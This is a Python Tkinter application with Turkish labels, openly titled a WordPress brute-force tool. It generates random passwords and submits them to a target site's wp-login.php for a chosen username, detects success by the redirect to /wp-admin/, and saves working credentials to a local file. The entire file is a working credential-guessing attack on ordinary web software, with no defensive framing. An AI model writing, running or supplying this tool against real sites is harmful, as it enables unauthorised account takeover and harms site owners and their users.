import tkinter as tk
from tkinter import messagebox
import requests
import random
import string
import time
import threading

def get_charset(option):
    if option == "Sayılar":
        return string.digits
    elif option == "Harfler":
        return string.ascii_letters
    elif option == "Özel Karakterler":
        return string.punctuation
    elif option == "Sayı + Harf":
        return string.ascii_letters + string.digits
    elif option == "Tümü":
        return string.ascii_letters + string.digits + string.punctuation
    return string.ascii_letters + string.digits + string.punctuation

def generate_password(length, charset):
    return ''.join(random.choices(charset, k=length))

def try_login(site_url, username, password):
    login_url = site_url.rstrip("/") + "/wp-login.php"
    
    headers = {
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded",
        "origin": site_url,
        "referer": site_url + "/wp-login.php",
        "user-agent": "Mozilla/5.0"
    }

    cookies = {
        "wordpress_test_cookie": "WP Cookie check"
    }

    data = {
        "log": username,
        "pwd": password,
        "wp-submit": "Oturum aç",
        "redirect_to": site_url + "/wp-admin/",
        "testcookie": "1"
    }

    response = requests.post(login_url, headers=headers, data=data, cookies=cookies, allow_redirects=False)

    return response.status_code == 302 and "Location" in response.headers and "/wp-admin/" in response.headers["Location"]

def save_success(site_url, username, password):
    with open("basarili_girisler.txt", "a", encoding="utf-8") as f:
        f.write(f"Site: {site_url}\nKullanıcı: {username}\nŞifre: {password}\n{'-'*40}\n")

def brute_force():
    site_url = url_entry.get().strip()
    username = user_entry.get().strip()
    try:
        min_len = int(min_len_entry.get())
        max_len = int(max_len_entry.get())
        max_attempts = int(max_attempts_entry.get())
        max_seconds = int(timeout_entry.get())
    except:
        messagebox.showerror("Hata", "Lütfen geçerli sayılar girin.")
        return

    charset = get_charset(charset_option.get())
    start_time = time.time()
    attempts = 0

    for length in range(min_len, max_len + 1):
        while True:
            if attempts >= max_attempts:
                log.insert(tk.END, f"\n⚠️ Maksimum deneme sayısına ulaşıldı.\n")
                return
            if time.time() - start_time > max_seconds:
                log.insert(tk.END, f"\n⏳ Süre sınırı doldu.\n")
                return

            password = generate_password(length, charset)
            log.insert(tk.END, f"[{attempts + 1}] {password}\n")
            log.see(tk.END)
            root.update()

            try:
                if try_login(site_url, username, password):
                    result = f"\n[✔] GİRİŞ BAŞARILI! Şifre: {password}\n"
                    log.insert(tk.END, result)
                    save_success(site_url, username, password)
                    return
            except Exception as e:
                log.insert(tk.END, f"[!] Hata: {e}\n")
                return

            attempts += 1

def start_thread():
    threading.Thread(target=brute_force, daemon=True).start()

# GUI
root = tk.Tk()
root.title("🔐 WordPress Brute Force GUI")
root.geometry("650x600")

tk.Label(root, text="🌐 Site URL:").pack()
url_entry = tk.Entry(root, width=50)
url_entry.pack()

tk.Label(root, text="👤 Kullanıcı Adı:").pack()
user_entry = tk.Entry(root, width=50)
user_entry.pack()

tk.Label(root, text="🔢 Şifre Uzunluğu (min - max):").pack()
min_len_entry = tk.Entry(root, width=10)
min_len_entry.insert(0, "4")
min_len_entry.pack()

max_len_entry = tk.Entry(root, width=10)
max_len_entry.insert(0, "8")
max_len_entry.pack()

tk.Label(root, text="🎛️ Karakter Tipi:").pack()
charset_option = tk.StringVar(value="Tümü")
tk.OptionMenu(root, charset_option, "Sayılar", "Harfler", "Özel Karakterler", "Sayı + Harf", "Tümü").pack()

tk.Label(root, text="⏱️ Süre sınırı (saniye):").pack()
timeout_entry = tk.Entry(root, width=10)
timeout_entry.insert(0, "60")
timeout_entry.pack()

tk.Label(root, text="🔁 Maksimum deneme sayısı:").pack()
max_attempts_entry = tk.Entry(root, width=10)
max_attempts_entry.insert(0, "100")
max_attempts_entry.pack()

tk.Button(root, text="🚀 Başlat", command=start_thread, bg="green", fg="white").pack(pady=10)

log = tk.Text(root, height=20, width=70)
log.pack()

root.mainloop()
